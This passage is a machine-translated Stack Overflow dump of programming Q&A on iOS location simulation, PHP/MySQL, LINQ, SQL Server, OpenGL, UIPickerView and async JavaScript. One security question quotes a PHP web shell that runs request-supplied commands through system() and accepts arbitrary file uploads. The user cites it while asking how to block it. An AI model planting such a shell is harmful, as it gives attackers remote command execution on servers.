    <wpt lat="55.94161770" lon="12.29576110"></wpt>
    <wpt lat="55.94148550" lon="12.29531040"></wpt>
    <wpt lat="55.94093270" lon="12.29522460"></wpt>
    <wpt lat="55.94041600" lon="12.29518170"></wpt>
    <wpt lat="55.94056020" lon="12.29398010"></wpt>
    <wpt lat="55.94024780" lon="12.29352950"></wpt>
    <wpt lat="55.94001940" lon="12.29335780"></wpt>
    <wpt lat="55.93992330" lon="12.29325050"></wpt>
    <wpt lat="55.93969490" lon="12.29299300"></wpt>
    <wpt lat="55.93952670" lon="12.29277840"></wpt>
    <wpt lat="55.93928630" lon="12.29260680"></wpt>
    <wpt lat="55.93915410" lon="12.29232780"></wpt>
    <wpt lat="55.93928630" lon="12.29202740"></wpt>
    <wpt lat="55.93933440" lon="12.29174850"></wpt>
    <wpt lat="55.93947860" lon="12.29116910"></wpt>
    <wpt lat="55.93965890" lon="12.29095450"></wpt>
    <wpt lat="55.94001940" lon="12.29061120"></wpt>
    <wpt lat="55.94041600" lon="12.29084730"></wpt>
    <wpt lat="55.94076450" lon="12.29101890"></wpt>
    <wpt lat="55.94080060" lon="12.29065410"></wpt>
    <wpt lat="55.94086060" lon="12.29031080"></wpt>
    <wpt lat="55.94092070" lon="12.28990310"></wpt>
    <wpt lat="55.94099280" lon="12.28975290"></wpt>
    <wpt lat="55.94119710" lon="12.28986020"></wpt>
    <wpt lat="55.94134130" lon="12.28998890"></wpt>
    <wpt lat="55.94147350" lon="12.29007480"></wpt>
    <wpt lat="55.94166580" lon="12.29003190"></wpt>
    <wpt lat="55.94176190" lon="12.28938810"></wpt>
    <wpt lat="55.94183400" lon="12.28893750"></wpt>
    <wpt lat="55.94194220" lon="12.28850840"></wpt>
    <wpt lat="55.94199030" lon="12.28835820"></wpt>
    <wpt lat="55.94215850" lon="12.28859420"></wpt>
    <wpt lat="55.94250700" lon="12.28883020"></wpt>
    <wpt lat="55.94267520" lon="12.28893750"></wpt>
    <wpt lat="55.94284350" lon="12.28902330"></wpt>
    <wpt lat="55.94304770" lon="12.28915210"></wpt>
    <wpt lat="55.94325200" lon="12.28925940"></wpt>
    <wpt lat="55.94348030" lon="12.28953830"></wpt>
    <wpt lat="55.94366060" lon="12.28966710"></wpt>
    <wpt lat="55.94388890" lon="12.28975290"></wpt>
    <wpt lat="55.94399700" lon="12.28994600"></wpt>
    <wpt lat="55.94379280" lon="12.29065410"></wpt>
    <wpt lat="55.94364860" lon="12.29095450"></wpt>
    <wpt lat="55.94350440" lon="12.29127640"></wpt>
    <wpt lat="55.94340820" lon="12.29155540"></wpt>
    <wpt lat="55.94331210" lon="12.29198450"></wpt>
    <wpt lat="55.94315590" lon="12.29269260"></wpt>
    <wpt lat="55.94310780" lon="12.29318610"></wpt>
    <wpt lat="55.94301170" lon="12.29361530"></wpt>
    <wpt lat="55.94292760" lon="12.29408740"></wpt>
    <wpt lat="55.94290350" lon="12.29436630"></wpt>
    <wpt lat="55.94287950" lon="12.29453800"></wpt>
    <wpt lat="55.94283140" lon="12.29533190"></wpt>
    <wpt lat="55.94274730" lon="12.29606150"></wpt>
    <wpt lat="55.94278340" lon="12.29621170"></wpt>
    <wpt lat="55.94280740" lon="12.29649060"></wpt>
    <wpt lat="55.94284350" lon="12.29679100"></wpt>
    <wpt lat="55.94284350" lon="12.29734890"></wpt>
    <wpt lat="55.94308380" lon="12.29837890"></wpt>
    <wpt lat="55.94315590" lon="12.29852910"></wpt>
    <wpt lat="55.94263920" lon="12.29906550"></wpt>
    <wpt lat="55.94237480" lon="12.29910850"></wpt>
    <wpt lat="55.94220660" lon="12.29915140"></wpt>
    <wpt lat="55.94208640" lon="12.29902260"></wpt>
    <wpt lat="55.94196620" lon="12.29887240"></wpt>
    <wpt lat="55.94176190" lon="12.29794970"></wpt>
    <wpt lat="55.94156970" lon="12.29760640"></wpt>
</gpx> 
```

我使用[GPSies.com](https://www.gpsies.com/)为 gpx 数据创建基础文件。不过需要进行一些清理。

通过运行模拟器并选择您的文件来激活

[![](https://i.stack.imgur.com/LN7Kl.png)](https://i.stack.imgur.com/LN7Kl.png)
[（来源：[castalandersen.dk](http://castleandersen.dk/keepers/location.png)）]

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2020-08-17T07:20:03.787

从 Xcode 11.6 和 Swift 5.3 开始，模拟自定义位置的功能已从 iOS 模拟器菜单中的“调试”移至“功能”。

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2011-08-19T04:38:16.387

您可以将 gpx 文件添加到您的项目并使用它：
编辑方案 > 选项 > 允许位置模拟 > 选择包含例如的文件名：

```
<?xml version="1.0"?>
<gpx version="1.1" creator="Xcode"> 
    <wpt lat="41.92296" lon="-87.63892"></wpt>
</gpx> 
```

可选地，只需硬编码位置管理器返回的纬度/经度值。虽然这是旧风格。

所以你不会将它添加到模拟器中，而是添加到你的 Xcode 项目中。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2014-10-16T10:17:53.100

Open iOS Simulator application from Debug Menu -> Location ->

1.  None
2.  Custom Location
3.  Apple Stores ...

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2011-02-21T09:20:48.057

[FutureTap的好心人在](http://www.futuretap.com/blog/simulating-core-location/)[GitHub 上](http://github.com/futuretap/FTLocationSimulator)免费提供了FTLocationSimulator 。它允许您使用例如 Google Earth 准备测试路线，然后让模拟器将这些坐标提供给您的应用程序。

我写了[一篇](http://www.infinite-loop.dk/blog/2011/02/testing-location-based-iphone-apps/)关于如何在测试位置功能期间使用 FTLocationSimulator 在多条路线之间轻松切换的博客文章。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2020-03-26T23:31:14.443

在撰写本文时，IOS 模拟器的位置选项已移至功能 -> 位置 -> 自定义位置

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-08-29T14:31:40.440

迟到总比不到好 ：）

我刚刚遇到了这个[iSimulate](http://www.vimov.com/isimulate/features/)，它允许您向应用发送假位置。该解决方案不是免费的。

```
> Q: How does iSimulate work? 

> A: When added to your project, the iSimulate
> SDK library creates a listening server
> on your iPhone Simulator that waits
> for a connection from an iPhone/iPod
> running the iSimulate client. When
> such connection is established, the
> iSimulate client running on your
> iPhone/iPod captures all data from the
> accelerometer sensor, the touch
> events, the location and device ID and
> streams them to the server. The
> iSimulate SDK library then recreates
> all input events synthetically. This
> is entirely transparent to your
> application and does not interfere
> with your application's functionality. 
```

无论如何，我打算得到这个。将很快更新更多！

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-11-07T08:19:22.107

你想在哪里设置你的位置？你可以使用 mapkit api 来显示你的位置。有关如何使用 mapkit 的更多详细信息，请参阅 icodeblog.com。您也可以存储您想要的坐标，只需创建一个对象 CLLocation2D *location; location.longitude=您想要的经度值；location.latitude=您想要的纬度值；

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2021-10-15T14:23:09.430

在 Xcode 本身（不是 Simulator 应用程序）中，可以通过 Debug 菜单 > Simulate Location 设置模拟位置。

当应用程序正在运行时（在模拟器上或在真实设备上），该菜单选项将启用。

[![XCode > 调试菜单 > 模拟位置 > 带有位置列表的子菜单](https://i.stack.imgur.com/o2KBq.png)](https://i.stack.imgur.com/o2KBq.png)

（从 XCode 13.0 开始）

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2021-09-25T06:16:15.727

更改模拟器的位置不会影响已构建、加载的应用程序。例如，如果您有一个在模拟器上运行的带有 Google 地图视图的应用程序，那么在您重新构建应用程序之前，地图不会更新。另外，请记住，在输入自定义纬度和经度时，您应该注意带有 (-) 符号和不带 (-) 符号的经度。用新的模拟器替换现有的自​​定义经度，但错误地保留 (-) 符号或输入不正确的纬度/经度将导致带有蓝色背景的空白地图屏幕 - 可能表示海洋或两极。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2022-02-06T07:48:07.613

从 iOS 15.2 和 Xcode 13.2.2 开始，模拟器具有可配置的位置。

在功能菜单下，最后一个条目是“位置”；这为您提供了一个子菜单：

无
自定义位置
City Run
City 自行车骑行
Freeway Drive
Apple

自定义位置允许您输入纬度/经度值。骑自行车、City Run 和 Freeway Drive 是对移动位置的模拟（当然是在库比蒂诺）。

# php - 检查 mysql_query 是否返回任何内容

> ID：214419
> 
> 赞同：20
> 
> 时间：2008-10-18T02:22:07.333
> 
> 标签：php, sql, mysql

```
$query = "SELECT * FROM `table`";
$results = mysql_query($query, $connection); 
```

如果 'table' 没有行。什么是最简单的检查方法。？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2008-10-18T13:48:50.583

Jeremy Ruten 上面的回答很好，执行速度很快；另一方面，它只给你行数，没有别的（如果你想要结果数据，你必须再次查询数据库）。我用什么：

```
// only ask for the columns that interest you (SELECT * can slow down the query)
$query = "SELECT some_column, some_other_column, yet_another_column FROM `table`";
$results = mysql_query($query, $connection);
$numResults = mysql_num_rows($results);
if ($numResults > 0) {
   // there are some results, retrieve them normally (e.g. with mysql_fetch_assoc())
} else {
   // no data from query, react accordingly
} 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2008-10-18T02:25:04.537

您可以使用[mysql_num_rows($results)](http://php.net/mysql_num_rows)检查是否返回了 0 行，或者使用这个更快的替代方法：

```
$query = "SELECT COUNT(*) AS total FROM table";
$results = mysql_query($query, $connection);
$values = mysql_fetch_assoc($results);
$num_rows = $values['total']; 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-10-19T06:19:45.247

或者，您可以简单地检查 mysql_fetch_assoc 的结果是否为假。

```
$query = "SELECT * FROM `table`";
$results = mysql_query($query, $connection);
$Row = mysql_fetch_assoc($results);
if ($Row == false)
{
  $Msg = 'Table is empty';
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-07-21T10:54:18.170

我注意到遗漏的一件事是查询可能不会成功，因此您需要检查是否设置了 $results 变量。我将以 yjerem 给出的答案为例。

```
$query = "SELECT COUNT(*) AS total FROM table";
$results = mysql_query($query, $connection);
if ($results) { // or use isset($results)
$values = mysql_fetch_assoc($results);
$num_rows = $values['total'];
} 
```

* * *

## 回答 #5

> 赞同：-6
> 
> 时间：2008-10-18T08:07:25.377

如果你遍历结果，你可以有一个计数器并检查它。

```
$x = 1;
$query = mysql_query("SELECT * FROM table");
while($row = mysql_fetch_assoc($query))
{
  $x++;
}
if($x == 1)
{
  //No rows
} 
```

# flash - 为什么升级到 Flash 10 后无法播放 Flash 视频？

> ID：214424
> 
> 赞同：0
> 
> 时间：2008-10-18T02:26:13.113
> 
> 标签：flash, video, flashplayer-10

今天升级到 Flash 10，现在很多网站都无法播放许多 Flash 视频，包括我创建的几个网站。解决方法是什么？

**编辑** 让我在这里澄清一下。此问题旨在查找允许所有 Flash 版本（包括最新版本）的用户能够看到它们所需的代码更改。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-19T17:46:05.677

Flash API 仅以字符串形式提供版本号，因此可能的原因是脚本从版本字符串中提取了单个字符，并看到“1”而不是“10”。那，或者天真的检查`(version==9)`而不是`(version>9)`.

注意：比较 like`(version>9)`将在 AS 中按预期工作，即使`version`是类似`"10"`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-18T12:14:02.523

这可能是由于版本检查。

确保网站可以正确处理两位数的版本号。特别是在使用字符串时，“9”在许多实现中大于“10”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T12:30:36.920

我同意 HS 的观点，这可能是由于网站使用了 Flash 版本的嗅探器，它排除了您的播放器。这在过去对我来说一直是个问题。要检查您是否属于这种情况，我建议您查看页面的源代码并搜索 swf 文件的路径。这可能在对象标记内或在一行 javascript 内。我通常会查找 .swf 并将整个路径复制到浏览器地址行中。如果在您执行此操作时播放视频，我想您可以向站点管理员发送一封电子邮件，要求他们修复其 swf 嵌入。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T18:56:09.820

这可能是 FlashDetect 脚本的产物，该脚本通过查看“。”之前的第一个字符来检查您拥有的 Flash 版本。像这样：y.charAt(y.indexOf('.')-1); 所以当它看到版本 10.0 时，它认为你有 flash 版本 0。

# .net - 如何比较 LINQ 中的日期？

> ID：214426
> 
> 赞同：16
> 
> 时间：2008-10-18T02:26:55.297
> 
> 标签：.net, linq

我想使用 LINQ 检查给定日期是否比今天的日期早一个多月。

这个的语法是什么？

提前致谢。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2008-10-18T02:41:57.450

我假设您在 where 子句中谈论。这与您在其他地方比较两个 DateTime 对象的方式基本相同。

```
using (DataContext context = new DataContext()) {
   var query = from t in context.table
               where t.CreateDate.Date < DateTime.Today.AddMonths(-1)
               select t;
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-01-17T18:00:43.463

只需添加，在 LINQ To Entities 中，您必须与变量进行比较。例子：

```
 DateTime lastMonth = DateTime.Today.AddMonths(-1);
        using (var db = new MyEntities())
        {
            var query = from s in db.ViewOrTable
                        orderby s.ColName
                        where (s.StartDate > lastMonth)
                        select s;

            _dsResults = query.ToList();
        } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-05-23T17:38:03.370

如果你不希望你的代码抛出

```
LINQ to Entities does not recognize the method 'System.DateTime AddYears(Int32)' method, and this method cannot be translated into a store expression. 
```

我建议使用 DbFunctions.AddYears。此外，如果您只关心日期而不关心时间，您可以使用 DbFunctions.TruncateTime

像这样的东西-

```
DbFunctions.TruncateTime(x.date) ==
DbFunctions.TruncateTime(DbFunctions.AddYears(DateTime.Today, 1)) 
```

# sql - Reconciling a column across two tables in SQL Server

> ID：214427
> 
> 赞同：3
> 
> 时间：2008-10-18T02:27:10.680
> 
> 标签：sql, sql-server

There are two Databases, Database A has a table A with columns of id, group and flag. Database B has a table B with columns of ID and flag. Table B is essentially a subset of table A `where the group == 'B'`.

They are updated/created in odd ways that are outside my understanding at this time, and are beyond the scope of this question (this is not the time to fix the basic setup and practices of this client).

The problem is that when the flag in Table A is updated, it is not reflected in table B, but should be. This is not a time-critical problem, so it was suggested I create a job to handle this. Maybe because it's the end of the week, or maybe because I've never written more than the most basic stored procedure (I'm a programmer, not a DBA), but I'm not sure how to go about this.

At a simplistic level, the stored procedure would be something along of the lines of

```
Select * in table A where group == B 
```

Then, loop through the `resultset`, and for each id, update the flag.

But I'm not even sure how to loop in a `stored procedure` like this. Suggestions? Example code would be preferred.

**Complication:** Alright, this gets a little harder too. For every group, Table B is in a separate database, and we need to update this flag for all groups. So, we would have to set up a separate trigger for each group to handle each DB name.

And yes, inserts to Table B are already handled - this is just to update flag status.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-19T11:37:57.273

```
UPDATE 
  DatabaseB.dbo.Table_B
SET 
  DatabaseB.dbo.Table_B.[Flag] = DatabaseA.dbo.Table_A.Flag
FROM 
  DatabaseA.dbo.Table_A inner join DatabaseB.dbo.Table_B B 
  on DatabaseA.dbo.id = DatabaseB.dbo.B.id 
```

复杂性：对于几个组，每个组运行一个这样的更新 SQL。

请注意，您可以使用不带 [] 的标志。我使用括号只是因为stackoverflow上的语法着色。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-18T03:51:09.497

假设 ID 是唯一键，并且您可以使用链接服务器或其他类似的服务器跨服务器运行查询，则此 SQL 语句应该有效（它适用于同一服务器上的两个表）。

```
UPDATE Table_B
SET Table_B.Flag = Table_A.Flag
FROM Table_A inner join Table_B on Table_A.id = Table_B.id 
```

（因为 Table_B 已经包含了 Table_A 中 group = B 的行子集，所以我们不必在查询中包含这个条件）

如果您不能使用链接服务器，那么我可能会尝试使用某种 SSIS 包来实现。或者我会使用[链接问题（上面的评论）](https://stackoverflow.com/questions/149132/how-can-one-iterate-over-stored-procedure-results-from-within-another-stored-pr)中描述的方法将数据库 A 中的相关数据获取到数据库 B 中的临时表等中，然后使用临时表运行此查询。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-18T03:00:41.203

在表 A 上创建一个更新触发器，在修改 A 时将必要的更改推送到 B。

基本上（语法可能不正确，我现在无法检查）。我似乎记得插入的表包含更新时的所有更新行，但您可能需要检查以确保。不过，我认为触发器是要走的路。

```
create trigger update_b_trigger
on Table_A
for update
as
begin
   update Table_B
   set Table_B.flag = inserted.flag
   from inserted
          inner join Table_B
             on inserted.id = Table_B.id 
                 and inserted.group = 'B'
                 and inserted.flag <> Table_B.flag
end 
```

[编辑] 我假设已经处理了对表 B 的插入/删除，它只是需要处理表 B 的标记更新。

# python - 使用格状结构作为管理 UI 交互规则的框架

> ID：214430
> 
> 赞同：1
> 
> 时间：2008-10-18T02:29:02.593
> 
> 标签：python, user-interface

有没有人有使用[格子](http://pypi.python.org/pypi/Trellis)的经验？将其视为在网格和数据输入屏幕中定义字段交互和验证规则的框架。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-07-19T11:23:55.820

看来这个项目已经死了。自从您提出问题以来，该页面没有添加任何新内容。此外，我认为 Python 2.6 和 Python 3 中的新语言特性正在消除对某些提供的结构的需求。

# security - 如何使我的 php.ini 文件影响我服务器的所有目录/子目录？

> ID：214431
> 
> 赞同：1
> 
> 时间：2008-10-18T02:30:11.530
> 
> 标签：security, php

几周前，我在共享服务器上打开了一个漏洞，我的朋友上传了以下 PHP 脚本：

```
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<?php
if(isset($_REQUEST['upload'])) {
    echo '<form enctype="multipart/form-data" action=".config.php?send" method="POST">
        <input type="hidden" name="MAX_FILE_SIZE" value="5120000" />
        Send this file: <input name="userfile" type="file" />
        To here: <input type="text" name="direct" value="/home/chriskan/public_html/_phx2600/wp-content/???" />
        <input type="submit" value="Send File" />
    </form>';
}
?>

<?php
if(isset($_REQUEST['send'])) {
    $uploaddir = $_POST["direct"];
    $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

    if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
        echo "File is valid, and was successfully uploaded.\n"; echo $uploaddir;
    } else {
        echo "Upload failed";
    }
}
?> 
```

该脚本允许他通过 URL 内变量处理命令。

我在 public_html 目录的 php.ini 文件中禁用了系统以及其他功能。如果脚本位于我的 public_html 目录中，这将阻止脚本运行，但如果它位于该目录的子目录中，则不会停止它。如果我将 php.ini 文件复制到子目录中，它将阻止它从该目录运行。

我的问题是，**如何使我的 php.ini 文件影响我服务器的所有目录/子目录？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-18T02:40:48.983

一，启动一个选择运行这样的脚本的“朋友”。

然后担心保护您的服务器。您的系统在某个地方有一个主 php.ini（通常是 /etc/php.ini，但如果可以在多个地方，请检查 php_info()）。该文件控制服务器的默认设置。此外，您可以阻止允许覆盖的本地设置文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T02:46:18.940

哇！按目录移动 php.ini 文件？不知道你能做到这一点。

我最好的猜测（如果我错了，请有人纠正我），php 可能会在每个目录的基础上使用一组本地规则覆盖全局 php.ini 文件（很像 .htaccess），所以基本上你需要做的就是将您的 php.ini 指令更新为全局 php.ini（在 ubuntu 中找到：etc/php5/apache2/php.ini）

或者，您可能想尝试使用 .htaccess 在所有页面上添加一个 php 页面，其中包含以下内容：

```
ini_set('your_directive') 
```

当然，请确保调用 prepend php 的 .htaccess 位于根目录，否则您会遇到同样的问题。

/mp

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T03:34:48.797

谢谢大家，你们的答案很棒，但答案一直就在我的眼皮底下。通过 cPanel，我能够编辑我的服务器以使用单个 php.ini 文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-26T09:01:12.160

你确定吗？我希望我有你的 ISP。默认情况下，*一些*ISP 将在 public_html 中提供 ini 文件的本地副本以允许覆盖。但是 cPanel 通常只提供服务器范围默认值的参考。

# performance - OpenGL：快速离屏渲染

> ID：214437
> 
> 赞同：5
> 
> 时间：2008-10-18T02:39:19.033
> 
> 标签：performance, opengl, 3d, rendering, off-screen

我需要使用 OpenGL 在屏幕外渲染很多（数万）图像。
我在 Windows 下运行并使用 QT 作为框架。解决方案只能是windows，这并不重要。

从我使用谷歌发现的情况来看，有很多选项可以做到这 [一点这篇文章](http://www.mesa3d.org/brianp/sig97/offscrn.htm)似乎相当过时，提出了一些方法，其中相关的方法是：

*   特定于 Windows - 使用`CreateDIBSection`并以某种方式将纹理绑定到它。
*   使用我的卡上似乎支持的 pbuffers 扩展。

[该线程](http://lists.trolltech.com/qt-interest/2008-04/thread00106-0.html)（消息 6）建议使用 QT 特定的方式来执行此操作`QGLWidget::renderPixmap`

我的问题是——哪一个是最快的方式？pbuffers 似乎是最安全的选择，因为它保证在硬件上执行但不是使用 CreateDIB 方法也通过硬件？QT方法呢？这似乎存在一些上下文创建问题。当然，我不想为我创建的每个图像创建一个新的上下文。
有没有人对此有一些好的经验？

* * *

**编辑**：回答评论 -
我有一个不变的场景，根本没有改变，我从许多不同的角度渲染它。现在，图像会返回给用户并由 CPU 处理。将来它们可能会在 GPU 上进行处理。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-18T03:30:22.673

使用[FBO](http://www.google.com/search?q=opengl+fbo)。它比 pbuffers 快速、便携并且更好用。

编辑：为了获得最佳性能，在两个不同的 FBO 之间交替渲染：

1.  渲染到 A
2.  渲染到 B
3.  从 A 读回并处理它
4.  渲染到 A
5.  从 B 回读
6.  转到 2

这样，您可以读回一个 FBO，然后在 GPU 并行渲染到另一个 FBO 时对其进行处理。

# ios - 你如何让 UIPickerView 组件环绕？

> ID：214441
> 
> 赞同：41
> 
> 时间：2008-10-18T02:41:10.510
> 
> 标签：ios, cocoa-touch, uipickerview

我想在 UIPickerView 组件中显示一组连续的数字，但让它像 Clock->Timer 应用程序的秒组件一样环绕。我可以启用的唯一行为类似于 Timer 应用程序的小时组件，您只能在一个方向上滚动。

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2008-12-15T03:56:29.493

将行数设置为大数字同样容易，并使其以较高的值开始，用户滚动滚轮很长时间的可能性很小——即使那样，情况越糟发生的是他们会触底。

```
- (NSInteger)pickerView:(UIPickerView *)pickerView numberOfRowsInComponent:(NSInteger)component {
    // Near-infinite number of rows.
    return NSIntegerMax;
}

- (NSString *)pickerView:(UIPickerView *)pickerView titleForRow:(NSInteger)row forComponent:(NSInteger)component {
    // Row n is same as row (n modulo numberItems).
    return [NSString stringWithFormat:@"%d", row % numberItems];
}

- (void)viewDidLoad {
    [super viewDidLoad];

    self.pickerView = [[[UIPickerView alloc] initWithFrame:CGRectZero] autorelease];
    // ...set pickerView properties... Look at Apple's UICatalog sample code for a good example.
    // Set current row to a large value (adjusted to current value if needed).
    [pickerView selectRow:currentValue+100000 inComponent:0 animated:NO];
    [self.view addSubview:pickerView];
}

- (void)pickerView:(UIPickerView *)pickerView didSelectRow:(NSInteger)row inComponent:(NSInteger)component {
    NSInteger actualRow = row % numberItems;
    // ...
} 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2008-10-21T13:51:23.853

我在这里找到了答案：

[http://forums.macrumors.com/showthread.php?p=6120638&highlight=UIPickerView#post6120638](http://forums.macrumors.com/showthread.php?p=6120638&highlight=UIPickerView#post6120638)

当它询问一行的标题时，给它： 代码：

```
return [rows objectAtIndex:(row % [rows count])]; 
```

当它说用户 didSelectRow:inComponent: 时，使用如下内容：

代码：

```
//we want the selection to always be in the SECOND set (so that it looks like it has stuff before and after)
if (row < [rows count] || row >= (2 * [rows count]) ) {
    row = row % [rows count];
    row += [rows count];
    [pickerView selectRow:row inComponent:component animated:NO];
} 
```

似乎Uipickerview不支持本地围绕包装，但是您可以通过插入更多要显示的数据集以及选择器停止，将组件居中到数据集的中间时来欺骗它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-05-24T21:45:55.517

只需多次创建一个数组，这样您就可以多次获得数字。让我们说什么时候想要从 0 到 23 的数字并将其放入一个数组中。我们会像这样做10次......

```
NSString *stdStepper;

    for (int j = 0; j<10; j++) {
        for(int i=0; i<24; i++)
        {
            stdStepper = [NSString stringWithFormat:@"%d", i];

            [_hoursArray addObject:stdStepper];

        }
    } 
```

后来我们像这样设置选择的第0行

```
[_hoursPickerView selectRow:120 inComponent:0 animated:NO]; 
```

# .net - 我在哪里获取 ULONG LoginID 值以传递给 WTSConnectSession？

> ID：214477
> 
> 赞同：3
> 
> 时间：2008-10-18T03:08:30.737
> 
> 标签：.net, c++, windows, windows-vista

我在哪里获取 ULONG LoginID 值以传递给[WTSConnectSession](http://msdn.microsoft.com/en-us/library/bb394782(VS.85).aspx)？我需要一个 ULONG LogonId 和一个 ULONG TargetLogonId。

这与我传入 WTSSessionId 时从[WTSQuerySessionInformation返回的 SessionID 相同吗？](http://msdn.microsoft.com/en-us/library/aa383838(VS.85).aspx)我怀疑不是（我试过了，但 WTSConnectSession 没有用。）

MSDN 词汇表说登录标识符是一个 LUID，我可以通过[GetTokenInformation](http://msdn.microsoft.com/en-us/library/aa446671(VS.85).aspx)获得它，但这是一个结构，而不是 ULONG。是否有从 LUID 获取 ULONG loginId 的 API？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-11-06T15:40:23.193

您正在寻找来自`WTSEnumerateSessions`、`WTSGetActiveConsoleSessionId`等的会话 ID `ProcessIdToSessionId`。当然， from`WTSQuerySessionInformation`也是一个会话 ID。

请记住，此函数需要两个会话 ID。

# user-interface - 这种类型的页面导航有名称吗？

> ID：214487
> 
> 赞同：3
> 
> 时间：2008-10-18T03:22:39.817
> 
> 标签：user-interface, navigation, pagination, paging

只是出于好奇，我一直在研究的那种导航有名字吗？

它看起来像这样：

`<<first <previous 1 2 3 4 5 [...] 20 next> last>>`

即导航你有*x个*页面，但你不想显示*x个*链接，你想限制占用的空间量，所以你一次显示*y*个链接，并指示其他页面的存在一个省略。

在中间的某个点，它看起来像这样：

`<<first <previous [...] 8 9 10 11 12 [...] 20 next> last>>`

两边都有省略。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-04-06T00:50:12.847

回答只是为了澄清这个问题。我在此声明它没有正式名称。

我也特此为它起了个名字“省略分页”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-18T03:42:20.700

它被称为网页分页，搜索结果分页。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T01:27:40.323

阈值导航寻呼机？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-26T18:56:22.067

不确定这个分页方案的普通版本叫什么（如果有的话）。

然而，我想出了一个能够处理大量页面的高级版本（当您远离当前页面或端点时，省略号 (...) 会连续跳过更大的页面块）。

我将我的方案称为“对数分页”或“对数页面导航”。

[您可以在此处](https://stackoverflow.com/questions/7835752/how-to-do-page-navigation-for-many-many-pages-logarithmic-page-navigation/)的 stackoverflow 上找到它（带有实现）。

# javascript - 包装异步 JavaScript 函数以使其同步的模式

> ID：214491
> 
> 赞同：19
> 
> 时间：2008-10-18T03:28:55.953
> 
> 标签：javascript, iphone, design-patterns, safari, mobile-safari

我正在使用 JavaScript API，其中大多数功能都是异步的。API 是[WebKit JavaScript 数据库 API](http://webkit.org/blog/126/webkit-does-html5-client-side-database-storage/)，它绑定到操作 SQLite3 数据库的功能子集。我理解使事物异步的设计决策，以不阻塞并提供响应式用户界面。在我的情况下，我知道我对异步 API 调用的使用将执行得很快。既然是这种情况，我想为我的开发人员提供一个更简洁、更易于使用的包装 API，它强制同步调用。

这是异步调用

```
db.executeSql(sqlStatement, function(result) {
  // do something with result
}); 
```

这就是我想做的

```
var result = dbWrapper.executeSql(sqlStatement);
// do something with result 
```

有没有设计模式/方法可以做到这一点？首选编写或链接到代码示例。目标平台/浏览器是 iPhone 上的 Mobile Safari。

谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-18T12:31:04.687

抱歉，JavaScript 不提供语言原语（例如线程或协程）来使异步事物同步运行，反之亦然。

您通常*仅获得一个执行线程，因此在导致创建请求的调用堆栈完全解开之前，您无法从计时器或 XMLHttpRequest readystatechange 获得回调。

所以简而言之，你不能真正做到；在您链接的 WebKit 页面上使用嵌套闭包的方法是我所知道的在这种情况下使代码可读的唯一方法。

*：除非在一些对您没有帮助并且通常被认为是错误的晦涩情况下

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2011-01-13T15:06:53.353

StratifiedJS 允许您这样做。

甚至还有一篇关于如何将其应用于浏览器存储的文章：http: [//onilabs.com/blog/stratifying-asynchronous-storage](http://onilabs.com/blog/stratifying-asynchronous-storage)

这是它使用的 Stratified JavaScript 库[https://gist.github.com/613526](https://gist.github.com/613526)

示例如下：

```
var db = require("webdatabase").openDatabase("CandyDB", ...);
try {
  var kids = db.executeSql("SELECT * FROM kids").rows;
  db.executeSql("INSERT INTO kids (name) VALUES (:name);", [kids[0]]);
  alert("done");
} catch(e) {
  alert("something went wrong");
} 
```

也许有点晚了，但当时技术还不存在；）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2010-01-05T03:45:59.690

您可以尝试以下方法：

```
function synch()
{
    var done = false;
    var returnVal = undefined;

    // asynch takes a callback method
    // that is called when done
    asynch(function(data) {
        returnVal = data;
        done = true;
    });

    while (done == false) {};
    return returnVal;
} 
```

但这可能会在异步方法期间冻结您的浏览器......

或者看看 Narrative JavaScript：*Narrative JavaScript 是 JavaScript 语言的一个小扩展，它支持异步事件回调的阻塞功能。这使得异步代码具有令人耳目一新的可读性和可理解性。*

[http://neilmix.com/narrativejs/doc/index.html](http://neilmix.com/narrativejs/doc/index.html)

麦克风

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-18T12:26:33.853

